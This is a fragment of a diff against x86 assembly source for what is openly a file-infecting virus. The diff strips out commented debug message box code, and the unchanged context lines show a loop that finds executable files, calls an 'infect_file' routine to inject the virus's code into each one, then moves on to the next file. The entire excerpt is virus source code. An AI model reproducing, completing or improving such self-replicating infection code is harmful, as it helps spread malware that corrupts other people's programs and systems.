@@ -83,16 +83,6 @@ search_exe_loop:
 
 	invoke	infect_file, fileptr, virtualalloc_addr, virtualfree_addr		; Procedure to properly inject our code into the file of interest.
 
-	; cmp		eax, 0								; DEBUG: if eax == 0 sth went wrong, print debug
-	; jne		infect_dbg							; DEBUG
-	; push	0									; DEBUG
-	; lea		ecx, [ebx + offset dbg_infectfail]	; DEBUG
-	; push	ecx									; DEBUG
-	; push	ecx									; DEBUG
-	; push	0									; DEBUG
-	; call	messagebox_addr						; DEBUG
-; infect_dbg:										; DEBUG
-
 	push	0							; 0 = from beginning of the file
 	push	0							; 0 = no high order DWORD for size to move
 	push	0							; size to move
@@ -129,15 +119,7 @@ open_failed:
 	cmp		eax, 0
 	je		exit_search_exe				; FindNextFile returned 0, file not found. Time to leave the loop, as no more files were found.
 
-	; jmp		no_syserr							; DEBUG
 syserr:
-	; push	0									; DEBUG
-	; lea		ecx, [ebx + offset dbg_sysfail]		; DEBUG
-	; push	ecx									; DEBUG
-	; push	ecx									; DEBUG
-	; push	0									; DEBUG
-	; call	messagebox_addr						; DEBUG
-;no_syserr:										; DEBUG
 
 	jmp		search_exe_loop				; Loop to infect next file.
 
